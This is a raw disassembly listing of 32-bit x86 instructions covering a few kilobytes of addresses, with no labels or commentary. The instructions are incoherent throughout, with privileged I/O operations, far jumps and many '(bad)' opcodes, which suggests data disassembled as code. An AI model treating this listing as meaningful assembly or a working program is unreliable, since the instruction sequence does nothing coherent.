  423f5c:	fiadd  WORD PTR [ecx]
  423f5e:	imul   eax,DWORD PTR [edi+ebx*4-0x19],0x5b75fb13
  423f66:	iret   
  423f67:	sar    BYTE PTR [esi],1
  423f69:	xchg   ebp,eax
  423f6a:	cld    
  423f6b:	sub    BYTE PTR ds:0xe8591d2e,dh
  423f71:	popa   
  423f72:	in     eax,0xa9
  423f74:	adc    ah,BYTE PTR [ecx]
  423f76:	loop   0x423f2b
  423f78:	mov    es,WORD PTR [edi-0x28]
  423f7b:	out    dx,al
  423f7c:	xchg   ebx,eax
  423f7d:	lock xchg DWORD PTR [eax+0x4f225294],esi
  423f84:	xchg   esp,eax
  423f85:	xor    BYTE PTR [ebx],ah
  423f87:	push   0x2d9fc6d9
  423f8c:	or     ah,al
  423f8e:	cmp    dl,bh
  423f90:	loopne 0x423f89
  423f92:	fld    QWORD PTR [edi+0x24]
  423f95:	and    eax,DWORD PTR ds:0x50c9e22c
  423f9b:	sub    al,0xf0
  423f9d:	jnp    0x423f4d
  423f9f:	jecxz  0x423f35
  423fa1:	fnstenv [edi+ecx*8-0x66]
  423fa5:	mov    ah,0x8a
  423fa7:	push   ds
  423fa8:	das    
  423fa9:	jae    0x42400a
  423fab:	cmp    al,0x7a
  423fad:	add    ch,al
  423faf:	mov    BYTE PTR [ebx+0x7543e36],bh
  423fb5:	pop    ss
  423fb6:	mov    ds,WORD PTR [edi+eiz*8-0x37c3ae9b]
  423fbd:	xor    ch,0x58
  423fc0:	mov    ebx,0x3093c611
  423fc5:	sti    
  423fc6:	mov    ebx,0x248199f8
  423fcb:	mov    dh,0xc8
  423fcd:	push   0xaece7af0
  423fd2:	xor    dh,BYTE PTR [ebp+0x2]
  423fd5:	push   esi
  423fd6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423fd7:	xor    ebp,ebx
  423fd9:	jg     0x423fb6
  423fdb:	jl     0x423f9d
  423fdd:	aaa    
  423fde:	or     ebp,esp
  423fe0:	mov    cl,0x0
  423fe2:	pop    ebx
  423fe3:	jno    0x423fcc
  423fe5:	popa   
  423fe6:	dec    eax
  423fe7:	aaa    
  423fe8:	cwde   
  423fe9:	test   al,0x26
  423feb:	retf   0x2e60
  423fee:	or     BYTE PTR [ebx+0x6ea138f0],ah
  423ff4:	mov    al,BYTE PTR [esi]
  423ff6:	push   eax
  423ff8:	push   DWORD PTR [eax+ecx*1]
  423ffb:	jge    0x424019
  423ffd:	jle    0x423fb0
  423fff:	and    al,0x23
  424001:	pusha  
  424002:	mov    edx,0xddd78182
  424007:	in     al,0xcd
  424009:	pop    ss
  42400a:	add    eax,0x4b25d0e1
  42400f:	dec    ecx
  424010:	or     edx,0x34
  424013:	sbb    eax,0x23ebe748
  424018:	lods   eax,DWORD PTR ds:[esi]
  424019:	push   cs
  42401a:	jb     0x423ff9
  42401c:	aad    0xc3
  42401e:	pop    edi
  42401f:	jmp    0x398f8413
  424024:	iret   
  424025:	xchg   DWORD PTR [ebx],esp
  424027:	mov    dl,0xe
  424029:	scas   eax,DWORD PTR es:[edi]
  42402a:	mov    bh,0x27
  42402c:	ss jb  0x424029
  42402f:	cdq    
  424030:	jmp    0xfae3:0x63648e74
  424037:	jb     0x42407e
  424039:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42403a:	out    0xf9,eax
  42403c:	jg     0x424064
  42403e:	dec    edi
  42403f:	repz stc 
  424041:	push   eax
  424042:	dec    ebx
  424043:	repz retf 0xd414
  424047:	ins    DWORD PTR es:[edi],dx
  424048:	xchg   esi,eax
  424049:	jo     0x423fe1
  42404b:	xor    ch,BYTE PTR [edx-0x39bdae84]
  424051:	jmp    0x423fde
  424053:	mov    al,ds:0xd0f21327
  424058:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424059:	daa    
  42405a:	xor    eax,0x9c95ebf4
  42405f:	sub    ebx,DWORD PTR [esi-0x558a8cdd]
  424065:	mov    edi,0xa40bbed6
  42406a:	xor    ebx,DWORD PTR [ecx]
  42406c:	sub    BYTE PTR [ebx+0x4a],cl
  42406f:	adc    al,0xd0
  424071:	pop    edi
  424072:	jl     0x4240dd
  424074:	add    dh,BYTE PTR [eax-0x27512597]
  42407a:	fldcw  WORD PTR [eax+0x576c37bd]
  424080:	mov    al,ds:0x9ff82caa
  424085:	mov    esi,0xceb9ba8c
  42408a:	cdq    
  42408b:	jle    0x42409d
  42408d:	push   esi
  42408e:	push   cs
  42408f:	jg     0x424034
  424091:	adc    ch,ah
  424093:	fild   QWORD PTR [esi]
  424095:	sti    
  424096:	pop    edi
  424097:	es xor al,0x66
  42409a:	fwait
  42409b:	jnp    0x4240d0
  42409d:	imul   esp,DWORD PTR [edx-0xa2a9a5e],0x51
  4240a4:	stc    
  4240a5:	add    eax,0x75034354
  4240aa:	ins    BYTE PTR es:[edi],dx
  4240ab:	loop   0x424112
  4240ad:	mov    al,BYTE PTR [ecx+0x3]
  4240b0:	mov    edi,0x9860df1
  4240b5:	adc    al,0x6b
  4240b7:	rcr    BYTE PTR [edx-0x58],1
  4240ba:	sti    
  4240bb:	es loopne 0x424054
  4240be:	cdq    
  4240bf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4240c0:	sub    eax,0xc6f46102
  4240c5:	bound  esi,QWORD PTR [ebp-0x1d6ad55d]
  4240cb:	ins    BYTE PTR es:[edi],dx
  4240cc:	pop    ecx
  4240cd:	popa   
  4240ce:	push   es
  4240cf:	ficomp DWORD PTR [eax+edi*8+0x202886e1]
  4240d6:	stc    
  4240d7:	mov    edi,0xce0d1c78
  4240dc:	ins    BYTE PTR es:[edi],dx
  4240dd:	inc    ebp
  4240de:	pop    ds
  4240df:	and    al,0xd2
  4240e1:	xor    eax,0xaf9bb921
  4240e6:	fnstcw WORD PTR [ebx+ebp*4+0x1b]
  4240ea:	mov    esp,0xc341ab1b
  4240ef:	dec    edx
  4240f0:	add    DWORD PTR [edi-0x2e],ebx
  4240f3:	in     eax,0x39
  4240f5:	into   
  4240f6:	mov    ds:0x3a38d711,eax
  4240fb:	mov    al,ds:0x1fa98299
  424100:	call   FWORD PTR [ebx-0x26761502]
  424106:	jb     0x4240d9
  424108:	push   ebp
  424109:	(bad)  
  42410a:	int3   
  42410b:	xor    eax,0x4db74fc6
  424110:	mov    edi,DWORD PTR [ebp-0x6a5e1e13]
  424116:	retf   
  424117:	mov    ecx,0x549642e3
  42411c:	pop    edx
  42411d:	ds loope 0x42415b
  424120:	adc    ecx,esi
  424122:	adc    eax,0x68e81a28
  424127:	inc    ebx
  424128:	loope  0x42415b
  42412a:	jns    0x42416d
  42412c:	mov    ds:0xc8495c41,eax
  424131:	adc    dl,BYTE PTR [eax-0xb]
  424134:	in     eax,dx
  424135:	in     al,dx
  424136:	mov    ebp,0x17979483
  42413b:	cmp    al,0x52
  42413d:	lea    ebx,[ebx+0x7564c1d2]
  424143:	ret    
  424144:	rcl    BYTE PTR [ecx],1
  424146:	ret    
  424147:	xchg   esi,ecx
  424149:	push   esp
  42414a:	fbstp  TBYTE PTR [ebx-0x1990d674]
  424150:	dec    esi
  424151:	fcom   QWORD PTR [ebx-0x7d2ced7a]
  424157:	jmp    0x424119
  424159:	push   es
  42415a:	in     al,0xa9
  42415c:	psrlq  mm4,mm5
  42415f:	jns    0x42416a
  424161:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424162:	imul   eax,DWORD PTR [eax-0x3a],0x46633970
  424169:	jp     0x4241a3
  42416b:	loop   0x424105
  42416d:	les    ebx,FWORD PTR [eax]
  42416f:	pusha  
  424170:	add    esi,ecx
  424172:	or     edx,eax
  424174:	int    0x25
  424176:	dec    ebp
  424177:	jl     0x424112
  424179:	leave  
  42417a:	shr    DWORD PTR [eax+0x739ff1ff],0x16
  424181:	and    al,0x2e
  424183:	in     al,dx
  424184:	fild   QWORD PTR [eax]
  424186:	xchg   ecx,eax
  424187:	and    ebp,0xb249aee0
  42418d:	mov    dl,0xdb
  42418f:	dec    edx
  424190:	dec    ebx
  424191:	and    eax,DWORD PTR [eax]
  424193:	ins    DWORD PTR es:[edi],dx
  424194:	stos   BYTE PTR es:[edi],al
  424195:	jecxz  0x424163
  424197:	mov    ebp,0x8333c696
  42419c:	hlt    
  42419d:	lds    ebx,FWORD PTR [esi+0xa05da5a]
  4241a3:	pusha  
  4241a4:	stc    
  4241a5:	fsubr  QWORD PTR [edx]
  4241a7:	xchg   edi,eax
  4241a8:	jecxz  0x42420c
  4241aa:	mov    ch,0x3f
  4241ac:	in     eax,dx
  4241ad:	imul   ebx,DWORD PTR [ebx+0x63e2c03f],0x5402fdca
  4241b7:	sbb    DWORD PTR [eax-0x2490d1e7],eax
  4241bd:	or     eax,ebx
  4241bf:	push   0x4d
  4241c1:	push   edx
  4241c2:	jne    0x4241de
  4241c4:	loope  0x4241fd
  4241c6:	push   ds
  4241c7:	add    DWORD PTR [ebp-0x4],esp
  4241ca:	fistp  QWORD PTR [edx+edi*1-0xe]
  4241ce:	sub    bh,bh
  4241d0:	retf   
  4241d1:	in     eax,0x67
  4241d3:	int3   
  4241d4:	mov    bl,0x85
  4241d6:	test   BYTE PTR [esi+0x2fc570c6],bl
  4241dc:	push   ss
  4241dd:	or     ebp,DWORD PTR [ebp-0x6b0eee46]
  4241e3:	mov    bh,0x3e
  4241e5:	sbb    al,0xaf
  4241e7:	icebp  
  4241e8:	add    al,cl
  4241ea:	mov    eax,0xee4ebad1
  4241ef:	lods   eax,DWORD PTR ds:[esi]
  4241f0:	stos   DWORD PTR es:[edi],eax
  4241f1:	mov    esi,0x9bb428ba
  4241f6:	sbb    eax,ebp
  4241f8:	sub    dl,BYTE PTR [ebx+0x16eb5466]
  4241fe:	pusha  
  4241ff:	adc    BYTE PTR [edx],dl
  424201:	in     eax,0x3e
  424203:	daa    
  424204:	(bad)  
  424205:	mov    edi,0x4e574c26
  42420a:	adc    BYTE PTR [esi+0x1a],0xee
  42420e:	mov    edi,0x51fe14a0
  424213:	push   edi
  424214:	push   eax
  424215:	xchg   edi,eax
  424216:	popa   
  424217:	enter  0x4f33,0x34
  42421b:	les    ebp,FWORD PTR [ebp+0x71641d1b]
  424221:	sbb    al,0xc2
  424223:	and    al,0xa0
  424225:	ds sti 
  424227:	out    0xf3,al
  424229:	push   0xad238392
  42422e:	add    DWORD PTR ss:0x5787f1cc,ebp
  424235:	and    al,0x9
  424237:	lahf   
  424238:	dec    ecx
  424239:	hlt    
  42423a:	adc    eax,0xb543861a
  42423f:	fdivr  DWORD PTR [ecx+0xf]
  424242:	sbb    esi,DWORD PTR [esi]
  424244:	shl    ebp,1
  424246:	cmp    cl,BYTE PTR [edi-0x6]
  424249:	jmp    0x270d:0x9c8e6a4d
  424250:	lods   eax,DWORD PTR ds:[esi]
  424251:	test   al,0x3f
  424253:	xchg   BYTE PTR [ebp+0x26fe6e27],ah
  424259:	add    BYTE PTR [edx],dl
  42425b:	and    esp,edi
  42425d:	inc    ecx
  42425e:	das    
  42425f:	push   edx
  424260:	pop    esi
  424261:	enter  0x6fe0,0x21
  424265:	mov    ds,WORD PTR [esi+edi*4+0x38]
  424269:	ret    
  42426a:	in     al,0x7f
  42426c:	push   ebp
  42426d:	pop    ds
  42426e:	in     eax,0x75
  424270:	dec    edi
  424271:	addr16 mov ebx,0xd5ce8a78
  424277:	push   es
  424278:	dec    edx
  424279:	add    ebx,DWORD PTR [ecx+0x3fea39b]
  42427f:	(bad)  
  424280:	out    dx,eax
  424281:	shl    BYTE PTR [ebp+0x50354a42],0xcd
  424288:	jmp    0x12b9ddf8
  42428d:	popa   
  42428e:	adc    edi,DWORD PTR [edi]
  424290:	push   ecx
  424291:	lds    edi,FWORD PTR [esp+edx*1-0x67]
  424295:	or     DWORD PTR [ebx],edi
  424297:	inc    eax
  424298:	xor    DWORD PTR [edx-0x52],edx
  42429b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42429c:	fwait
  42429d:	xor    al,BYTE PTR [edi-0x37]
  4242a0:	push   eax
  4242a1:	adc    eax,0x8f169b97
  4242a6:	mov    dh,0xc1
  4242a8:	adc    DWORD PTR [ecx],eax
  4242aa:	test   bh,0x10
  4242ad:	mov    cs,WORD PTR [ecx]
  4242af:	cmp    BYTE PTR [ebx],al
  4242b1:	xchg   edx,eax
  4242b3:	jbe    0x42432c
  4242b5:	in     eax,0xb8
  4242b7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4242b8:	mov    edx,0xbcef37a7
  4242bd:	jecxz  0x42427d
  4242bf:	fisub  DWORD PTR [edi-0x4f]
  4242c2:	or     bl,BYTE PTR [esp+eiz*2-0x51]
  4242c6:	or     BYTE PTR [edx+eax*4+0x22],ch
  4242ca:	ss (bad) 
  4242cd:	jb     0x42429e
  4242cf:	std    
  4242d0:	mov    edi,0x63bb7921
  4242d5:	call   0x1aca:0x988cba29
  4242dc:	fs inc esp
  4242de:	push   ds
  4242df:	xchg   ebx,eax
  4242e0:	jmp    0x8290:0x8f87a4ae
  4242e7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4242e8:	adc    cl,BYTE PTR [edx-0x48]
  4242eb:	enter  0xb31e,0x34
  4242ef:	mov    dl,0x65
  4242f1:	and    al,al
  4242f3:	jp     0x4242b7
  4242f5:	mov    ch,0x15
  4242f7:	into   
  4242f8:	add    esp,edx
  4242fa:	dec    edx
  4242fb:	or     bh,BYTE PTR [ecx+0x121f8583]
  424301:	aaa    
  424302:	fstp   QWORD PTR [ebp+ecx*8-0x41]
  424306:	inc    edx
  424307:	sbb    DWORD PTR [eax-0x3c8e12c9],ebp
  42430d:	imul   ebp,DWORD PTR [ebp+0x644dfbf],0x74
  424314:	dec    esp
  424315:	not    BYTE PTR [ecx-0x7d791daf]
  42431b:	popa   
  42431c:	mov    bl,0x84
  42431e:	inc    ebp
  42431f:	cmp    al,0xf1
  424321:	(bad)  
  424322:	push   ebx
  424323:	pop    edi
  424324:	ret    
  424325:	mul    esi
  424327:	mov    DWORD PTR [ecx+ebp*1-0x14],esp
  42432b:	repz leave 
  42432d:	sbb    eax,0x7cf8bee3
  424332:	(bad)  
  424333:	rcl    DWORD PTR [edx+0x7fb58dc7],1
  424339:	or     BYTE PTR [ebx-0x2e],ah
  42433c:	mov    esp,0xcec34cce
  424341:	or     edi,0x213ed49f
  424347:	cli    
  424348:	mov    bh,0x9a
  42434a:	outs   dx,DWORD PTR ds:[esi]
  42434b:	or     cl,BYTE PTR gs:[ecx+0x4bc3bcb5]
  424352:	sub    BYTE PTR [ebp+0x5d],al
  424355:	jnp    0x424324
  424357:	mov    WORD PTR [esi],?
  424359:	pop    eax
  42435a:	sar    DWORD PTR [ebx-0x43],0xcb
  42435e:	push   esp
  42435f:	add    eax,0x9de9b915
  424364:	sti    
  424365:	or     BYTE PTR [ebx+0x351f46e],dh
  42436b:	xor    BYTE PTR [edi],0xca
  42436e:	(bad)
  424372:	pop    ss
  424373:	icebp  
  424374:	pop    edx
  424375:	add    bl,BYTE PTR [ebp+0x5c5e881c]
  42437b:	xor    esi,DWORD PTR [edx]
  42437d:	test   DWORD PTR [ebx-0x6b219262],esp
  424383:	xor    al,0x92
  424385:	clc    
  424386:	and    al,0x78
  424388:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424389:	or     al,0x30
  42438b:	push   ecx
  42438c:	cld    
  42438d:	add    BYTE PTR [ecx+0x54],dl
  424390:	xchg   ebp,eax
  424391:	in     al,0xb6
  424393:	or     BYTE PTR [ebp+edi*8+0xbafbfd5],bh
  42439a:	rcr    DWORD PTR [ecx],1
  42439c:	shl    BYTE PTR [edi+0x606d1d08],1
  4243a2:	push   edx
  4243a3:	(bad)  
  4243a4:	ins    DWORD PTR es:[edi],dx
  4243a5:	std    
  4243a6:	jecxz  0x42433d
  4243a8:	popa   
  4243a9:	dec    BYTE PTR [esi-0x19]
  4243ac:	pop    eax
  4243ad:	xchg   ebx,eax
  4243ae:	je     0x424330
  4243b0:	sti    
  4243b1:	xlat   BYTE PTR ds:[ebx]
  4243b2:	in     al,0xa4
  4243b4:	mov    ah,0x25
  4243b6:	add    dh,bh
  4243b8:	dec    ebx
  4243b9:	or     al,0x39
  4243bb:	pop    ebp
  4243bc:	push   ds
  4243bd:	mov    eax,0xe105d6c6
  4243c2:	pop    ebx
  4243c3:	push   ebp
  4243c4:	dec    ebp
  4243c5:	pop    edi
  4243c6:	mov    eax,ds:0x5aa38b60
  4243cb:	es out dx,eax
  4243cd:	push   ebp
  4243ce:	jno    0x424359
  4243d0:	push   ecx
  4243d1:	int3   
  4243d2:	push   ecx
  4243d3:	cli    
  4243d4:	nop    ebx
  4243d7:	jns    0x4243e5
  4243d9:	push   eax
  4243da:	sub    BYTE PTR [edx+0xce32838],0x6
  4243e1:	mov    eax,ds:0x40fd3840
  4243e6:	fadd   DWORD PTR [edi-0x126e76d8]
  4243ec:	add    eax,0xa5f384f6
  4243f1:	dec    edx
  4243f2:	and    bh,BYTE PTR [ebp+0x51]
  4243f5:	lahf   
  4243f6:	in     eax,0xdf
  4243f8:	in     eax,dx
  4243f9:	cs mov bh,0x63
  4243fc:	push   edx
  4243fd:	cli    
  4243fe:	ja     0x42439b
  424400:	mul    DWORD PTR [edi]
  424402:	adc    al,0x15
  424404:	xor    eax,0x2c03289a
  424409:	xor    al,0xee
  42440b:	ins    BYTE PTR es:[edi],dx
  42440c:	icebp  
  42440d:	(bad)
  424412:	out    0x6c,eax
  424414:	jmp    0x424494
  424416:	addr16 dec ebp
  424418:	lea    ebx,[ecx-0x3f]
  42441b:	sub    al,BYTE PTR [esi+0x32cbdb37]
  424421:	loop   0x424499
  424423:	inc    edi
  424424:	aad    0x8a
  424426:	pop    ds
  424427:	mov    ebp,DWORD PTR [ecx+ebx*8+0x6a]
  42442b:	nop
  42442c:	aaa    
  42442d:	push   edi
  42442e:	sbb    DWORD PTR [eax+0x30],esp
  424431:	inc    edi
  424432:	repz push esi
  424434:	out    dx,al
  424435:	dec    ebp
  424436:	hlt    
  424437:	dec    esp
  424438:	repz and eax,0x72591298
  42443e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42443f:	sub    eax,0xf1c1223a
  424444:	jbe    0x4243d5
  424446:	pop    esp
  424447:	cmc    
  424448:	mov    ah,0xd7
  42444a:	clc    
  42444b:	push   edi
  42444c:	mov    eax,0xbf2557a
  424451:	popa   
  424452:	mov    dh,0xd2
  424454:	mov    eax,edx
  424456:	arpl   WORD PTR [edx+0x3d],si
  424459:	mov    cl,0xa3
  42445b:	fs leave 
  42445d:	mov    WORD PTR [esi-0x72],?
  424460:	add    ch,cl
  424462:	std    
  424463:	add    al,0xcd
  424465:	clc    
  424466:	lock or cl,BYTE PTR [ebx+0x4f]
  42446a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42446b:	dec    edi
  42446c:	arpl   bx,di
  42446e:	mov    esp,0x264a7ea5
  424473:	outs   dx,BYTE PTR ds:[esi]
  424474:	lock mov DWORD PTR [edx+0x51dfb92a],esp
  42447b:	sahf   
  42447c:	outs   dx,BYTE PTR ds:[esi]
  42447d:	lock dec esi
  42447f:	add    ecx,DWORD PTR [ebx]
  424481:	call   0xbdba4b23
  424486:	imul   ebp,DWORD PTR [ebp-0x46],0x5fe5fbc5
  42448d:	cmp    dh,cl
  42448f:	mov    al,0xbd
  424491:	cdq    
  424492:	popa   
  424493:	jecxz  0x4244be
  424495:	mov    eax,0x8b
	...
  424512:	add    BYTE PTR [eax],al
  424514:	push   cs
  424515:	pop    esp
  424516:	mov    esp,0xffe7fe47
  42451b:	pop    ebp
  42451c:	es mov eax,0x31f2fe17
  424522:	and    DWORD PTR [eax],ecx
  424524:	psubusw mm0,QWORD PTR [ecx]
  424527:	add    BYTE PTR [ebx+0x7],ch
  42452a:	add    BYTE PTR [eax],al
  42452c:	mov    dl,0x16
  42452e:	and    al,0xf4
  424530:	cwde   
  424531:	pusha  
  424532:	mov    ebx,esi
  424534:	fldenv [esi+0x6f542d4e]
  42453a:	pop    ecx
  42453b:	xor    al,0xb3
  42453d:	pop    edi
  42453e:	std    
  42453f:	adc    al,0x41
  424541:	or     al,0xe0
  424543:	xchg   edi,eax
  424544:	(bad)  [edx+0x11]
  424547:	push   ds
  424548:	mov    ds:0x10e3057c,eax
  42454d:	xor    al,BYTE PTR [eax+eiz*1]
  424550:	test   al,0xfd
  424552:	jmp    0xd450:0x22f29efd
  424559:	sbb    DWORD PTR [ecx+0x237678ae],0x9e94d12
  424563:	sub    DWORD PTR [ecx],ebp
  424565:	mov    esp,0x6200729
  42456a:	xchg   esp,eax
  42456b:	adc    cl,bh
  42456d:	mov    eax,0xc359802
  424572:	xor    eax,DWORD PTR [edi-0x7f]
  424575:	xchg   ecx,eax
  424576:	adc    BYTE PTR [ecx+ebp*2],bl
  424579:	ja     0x4245b4
  42457b:	add    ch,BYTE PTR [edx-0x1e093df4]
  424581:	dec    edx
  424582:	rcr    BYTE PTR [ebp+ebp*1+0x23],cl
  424586:	dec    eax
  424587:	xor    BYTE PTR [edi],bl
  424589:	mov    esi,0xb8f8760c
  42458e:	out    0x8f,eax
  424590:	inc    ecx
  424591:	sbb    ah,BYTE PTR [edi+0x322a04ac]
  424597:	test   DWORD PTR [edi],0xbc615c8c
  42459d:	push   ds
  42459e:	adc    BYTE PTR [esi],0xfe
  4245a1:	retf   0x417f
  4245a4:	leave  
  4245a5:	mov    edi,0xc0cd8832
  4245aa:	cmp    BYTE PTR [esi-0x10],cl
  4245ad:	mov    ebx,0x3d6dea37
  4245b2:	pop    ds
  4245b3:	inc    ebx
  4245b4:	fist   DWORD PTR [edx-0x2ffadefb]
  4245ba:	add    edi,esp
  4245bc:	and    eax,0x60dfe597
  4245c1:	mov    ah,0xf0
  4245c3:	imul   esp,esp,0xffffffac
  4245c6:	sub    BYTE PTR [ecx+0x11783326],al
  4245cc:	jmp    0x9fe36bdf
  4245d1:	inc    ecx
  4245d2:	xchg   BYTE PTR [ecx-0x7f],ch
  4245d5:	(bad)  
  4245d6:	cld    
  4245d7:	cmp    cl,BYTE PTR [eax-0x66]
  4245da:	stc    
  4245db:	xlat   BYTE PTR ds:[ebx]
  4245dc:	mov    dh,0xf5
  4245de:	clc    
  4245df:	clc    
  4245e0:	and    esi,DWORD PTR [edi-0x73]
  4245e3:	inc    ebp
  4245e4:	int    0xc
  4245e6:	stos   BYTE PTR es:[edi],al
  4245e7:	test   eax,0xbe1e6af0
  4245ec:	jmp    0x42459e
  4245ee:	repnz mov BYTE PTR [esi-0x4],ah
  4245f2:	sbb    BYTE PTR [eax+0x6440653c],ch
  4245f8:	cs or  ecx,eax
  4245fb:	mov    al,0x9d
  4245fd:	add    eax,DWORD PTR [ebx-0x1e]
  424600:	add    esp,ebp
  424602:	dec    ebp
  424603:	or     ebp,edx
  424605:	push   esp
  424606:	mov    bl,0x3f
  424608:	popf   
  424609:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42460a:	cmp    BYTE PTR [ecx+0x1],bh
  42460d:	outs   dx,DWORD PTR ds:[esi]
  42460e:	adc    BYTE PTR [edx-0x44],bl
  424611:	mov    al,ds:0x4d3af1e3
  424616:	mov    WORD PTR [edi],es
  424618:	(bad)  [ebx-0x61]
  42461b:	stos   BYTE PTR es:[edi],al
  42461c:	xchg   ebp,eax
  42461d:	idiv   BYTE PTR [ebx+ecx*1-0x71]
  424621:	sub    al,bl
  424623:	xchg   BYTE PTR [ebp-0x45],dl
  424626:	fcom   QWORD PTR [edx+0x5f8f6fcb]
  42462c:	daa    
  42462d:	mov    ch,0x36
  42462f:	fld    TBYTE PTR [ebx+0x15]
  424632:	in     eax,dx
  424633:	retf   0xbe8e
  424636:	push   cs
  424637:	lock adc al,0x8a
  42463a:	out    dx,al
  42463b:	rcr    BYTE PTR [edi-0x49],0xb9
  42463f:	sbb    al,0x5
  424641:	arpl   WORD PTR [eax-0x20],cx
  424644:	mov    ebx,0x66bdd20f
  424649:	into   
  42464a:	lds    esp,FWORD PTR [ecx-0x38]
  42464d:	push   0x7e326ecf
  424652:	(bad)  
  424653:	(bad)  
  424654:	lock pop eax
  424656:	sub    eax,0x191ce4b7
  42465b:	push   cs
  42465c:	ds push 0xcb27a9fa
  424662:	dec    esi
  424663:	(bad)  
  424664:	scas   eax,DWORD PTR es:[edi]
  424665:	xchg   esi,eax
  424666:	add    bh,bh
  424668:	push   esp
  424669:	push   0x5df39d8d
  42466e:	push   edx
  42466f:	aad    0x81
  424671:	sub    esi,ebx
  424673:	inc    esp
  424674:	test   BYTE PTR [eax+0x2d304c41],ch
  42467a:	scas   eax,DWORD PTR es:[edi]
  42467b:	sub    eax,0x7cd423ff
  424680:	pop    esi
  424681:	dec    ebp
  424682:	in     eax,dx
  424683:	pop    edx
  424684:	xchg   edi,eax
  424685:	pop    eax
  424686:	xchg   BYTE PTR [edx],bh
  424688:	int3   
  424689:	imul   eax,DWORD PTR [ebx-0x2f],0x7049f4e7
  424690:	mov    ds:0xe4f587bf,al
  424695:	inc    esi
  424696:	xchg   edi,eax
  424697:	or     BYTE PTR [esi+edi*1+0x19],cl
  42469b:	loop   0x4246a8
  42469d:	pop    eax
  42469e:	jbe    0x4246a1
  4246a0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4246a1:	cmp    eax,0x61f9ffd4
  4246a6:	push   ss
  4246a7:	sub    al,0x7f
  4246a9:	cmp    dl,cl
  4246ab:	std    
  4246ac:	rol    BYTE PTR [ecx-0x1906764b],cl
  4246b2:	xchg   edx,eax
  4246b3:	sbb    al,0x9c
  4246b5:	fcmovne st,st(3)
  4246b7:	or     al,0xf5
  4246b9:	ret    0x90e5
  4246bc:	das    
  4246bd:	or     al,0x8b
  4246bf:	cs mov bl,0xd1
  4246c2:	cmp    esp,ebx
  4246c4:	std    
  4246c5:	jns    0x42472f
  4246c7:	in     eax,dx
  4246c8:	push   esi
  4246c9:	scas   eax,DWORD PTR es:[edi]
  4246ca:	sub    dh,BYTE PTR [ebx-0x42ee29f9]
  4246d0:	pop    ebp
  4246d1:	ins    BYTE PTR es:[edi],dx
  4246d2:	xcrypt-ofb 
  4246d5:	ret    0x4f61
  4246d8:	pusha  
  4246d9:	mov    bh,0xb2
  4246db:	imul   esp,DWORD PTR [ebx+0x2c],0xc5eb5505
  4246e2:	ss dec eax
  4246e5:	sub    al,0x4c
  4246e7:	scas   eax,DWORD PTR es:[edi]
  4246e8:	adc    esp,DWORD PTR [ecx-0x18b10ceb]
  4246ee:	or     eax,0x1318d655
  4246f3:	leave  
  4246f4:	add    eax,0x10b49232
  4246f9:	cmp    BYTE PTR [esi+edx*1],bl
  4246fc:	cmp    eax,ebp
  4246fe:	xchg   edx,ebp
  424700:	iret   
  424701:	rol    BYTE PTR [eax],0xb1
  424704:	nop
  424705:	std    
  424706:	dec    esi
  424707:	cmp    esp,DWORD PTR [ebp-0x65bab717]
  42470d:	adc    eax,0x3fe39ec6
  424712:	sbb    eax,DWORD PTR [ecx]
  424714:	pop    DWORD PTR [esi+0x52]
  424717:	and    al,0x7e
  424719:	push   esi
  42471a:	clc    
  42471b:	push   cs
  42471c:	iret   
  42471d:	in     eax,dx
  42471e:	shl    BYTE PTR [ecx+0x3a78d5f5],cl
  424724:	dec    esi
  424725:	(bad)  
  424726:	cmp    eax,0x2357ed03
  42472b:	sub    DWORD PTR [edx+eax*2+0x35b16654],ecx
  424732:	pop    ds
  424733:	aaa    
  424734:	mov    cl,BYTE PTR ds:0x6bfc0baa
  42473a:	adc    BYTE PTR gs:[ecx],ch
  42473d:	inc    edx
  42473e:	ret    
  42473f:	xchg   DWORD PTR [esp+ebx*8],ebx
  424742:	lods   eax,DWORD PTR ds:[esi]
  424743:	sahf   
  424744:	sti    
  424745:	and    BYTE PTR [ebp-0x37],cl
  424748:	adc    cx,ax
  42474b:	mov    edx,0x66702407
  424750:	pop    edi
  424751:	or     ebx,ecx
  424753:	xchg   ebx,esp
  424755:	and    eax,0x108e2ee8
  42475a:	dec    edi
  42475b:	push   ecx
  42475c:	adc    WORD PTR [edi+0x60],bx
  424760:	jne    0x4246ea
  424762:	sbb    eax,DWORD PTR [edx+0x0]
  424765:	mov    eax,0x28fa360
  42476a:	(bad)  
  42476b:	in     eax,dx
  42476c:	(bad)  
  42476d:	cmc    
  42476e:	pop    ecx
  42476f:	xchg   ebx,eax
  424770:	out    0x39,eax
  424772:	fs mov bl,0x51
  424775:	fsub   DWORD PTR [edx+0x5aadde29]
  42477b:	cli    
  42477c:	es push ecx
  42477e:	ins    BYTE PTR es:[edi],dx
  42477f:	mov    edi,0xf5ddc8c1
  424784:	adc    DWORD PTR [eax-0x5ddb4b0b],eax
  42478a:	push   edi
  42478b:	sbb    ebx,DWORD PTR [ebx+0xc]
  42478e:	sbb    al,ch
  424790:	shl    DWORD PTR [edi+ebp*8],cl
  424793:	sub    DWORD PTR [esi-0x5d1f69a1],ebp
  424799:	xchg   ebp,eax
  42479a:	and    eax,DWORD PTR [ebx+0x54]
  42479d:	inc    ebx
  42479e:	adc    al,0x19
  4247a0:	and    DWORD PTR ds:0x59fde1d6,0x1b
  4247a7:	pop    eax
  4247a8:	push   edi
  4247a9:	sbb    DWORD PTR [esi+ebx*8],edx
  4247ac:	sti    
  4247ad:	inc    ebp
  4247ae:	dec    edi
  4247af:	inc    eax
  4247b0:	xor    ebx,DWORD PTR [ebx-0x102a34e9]
  4247b6:	es ss add ecx,esi
  4247ba:	pusha  
  4247bb:	in     eax,dx
  4247bc:	fwait
  4247bd:	sbb    al,0x87
  4247bf:	xor    ah,0xde
  4247c2:	addr16 test al,0x71
  4247c5:	stc    
